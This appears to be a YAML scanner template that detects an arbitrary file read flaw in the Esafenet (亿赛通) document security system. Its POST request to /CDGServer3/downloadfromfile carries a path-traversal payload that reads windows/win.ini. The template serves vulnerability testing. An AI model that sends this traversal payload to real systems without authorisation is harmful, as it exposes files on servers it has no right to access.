name: 亿赛通-电子文档安全管理系统-downloadfromfile-文件读取
description: >-
  任意文件读取
alwaysExecute: false
matchCount: 1
rules:
  - method: POST
    path: /CDGServer3/downloadfromfile
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: >-
      fileName=../../../../../../../../../../../windows/win.ini
    expression:
      status: 200
      body_all: ["fonts"]